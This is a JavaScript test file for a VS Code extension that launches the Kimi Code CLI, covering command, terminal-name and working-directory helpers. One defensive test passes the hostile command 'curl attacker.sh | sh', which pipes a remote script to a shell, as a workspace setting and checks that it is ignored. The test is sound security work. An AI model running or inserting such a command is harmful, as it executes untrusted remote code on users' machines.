const test = require('node:test');
const assert = require('node:assert/strict');

const {
  normalizeCliCommand,
  normalizeTerminalName,
  buildTerminalName,
  buildExtensionSettingsQuery,
  resolveCliCommandSetting,
  resolveTerminalCwd,
} = require('../out/command-utils.js');

// The resolved command is sent straight to a terminal. `configuration.get()`
// also resolves workspace values, so a cloned repo shipping a .vscode/settings.json
// could pick the command that runs on the first toolbar click. These cover the
// user-level-only contract that keeps that from happening.
test('resolveCliCommandSetting prefers the user-level value', () => {
  assert.equal(resolveCliCommandSetting({ defaultValue: 'kimi', globalValue: 'kimi --verbose' }), 'kimi --verbose');
});

test('resolveCliCommandSetting ignores workspace-controlled values', () => {
  // A workspaceValue/workspaceFolderValue is never read, so a hostile repo
  // cannot substitute the command.
  assert.equal(
    resolveCliCommandSetting({
      defaultValue: 'kimi',
      workspaceValue: 'curl attacker.sh | sh',
      workspaceFolderValue: 'curl attacker.sh | sh',
    }),
    'kimi',
  );
});

test('resolveCliCommandSetting falls back when inspection is undefined', () => {
  assert.equal(resolveCliCommandSetting(undefined), 'kimi');
});

test('normalizeCliCommand trims configured values', () => {
  assert.equal(normalizeCliCommand('  kimi --continue  '), 'kimi --continue');
});

test('normalizeCliCommand falls back when value is undefined', () => {
  assert.equal(normalizeCliCommand(undefined), 'kimi');
});

test('normalizeCliCommand preserves a blank command for validation', () => {
  assert.equal(normalizeCliCommand('   '), '');
});

test('normalizeTerminalName trims configured values', () => {
  assert.equal(normalizeTerminalName('  Kimi Session  '), 'Kimi Session');
});

test('buildTerminalName uses the base name for the first terminal', () => {
  assert.equal(buildTerminalName('  Kimi Code CLI  ', 1), 'Kimi Code CLI');
});

test('buildTerminalName appends the sequence after the first terminal', () => {
  assert.equal(buildTerminalName('Kimi Code CLI', 3), 'Kimi Code CLI 3');
});

test('buildTerminalName falls back when the configured name is blank', () => {
  assert.equal(buildTerminalName('   ', 2), 'Kimi Code CLI 2');
});

test('buildExtensionSettingsQuery targets the current extension id', () => {
  assert.equal(
    buildExtensionSettingsQuery('mikesoft.vscode-kimi-code-cli-launcher'),
    '@ext:mikesoft.vscode-kimi-code-cli-launcher',
  );
});

test('resolveTerminalCwd uses the active editor workspace when available', () => {
  const workspace = {
    workspaceFolders: [{ uri: 'workspace-a' }, { uri: 'workspace-b' }],
    getWorkspaceFolder(uri) {
      return uri === 'file-b' ? { uri: 'workspace-b' } : undefined;
    },
  };

  assert.equal(resolveTerminalCwd({ document: { uri: 'file-b' } }, workspace), 'workspace-b');
});

test('resolveTerminalCwd falls back to the first workspace', () => {
  const workspace = {
    workspaceFolders: [{ uri: 'workspace-a' }, { uri: 'workspace-b' }],
    getWorkspaceFolder() {
      return undefined;
    },
  };

  assert.equal(resolveTerminalCwd({ document: { uri: 'external-file' } }, workspace), 'workspace-a');
  assert.equal(resolveTerminalCwd(undefined, workspace), 'workspace-a');
});

test('resolveTerminalCwd returns undefined when no workspace is open', () => {
  const workspace = {
    workspaceFolders: undefined,
    getWorkspaceFolder() {
      return undefined;
    },
  };

  assert.equal(resolveTerminalCwd(undefined, workspace), undefined);
});
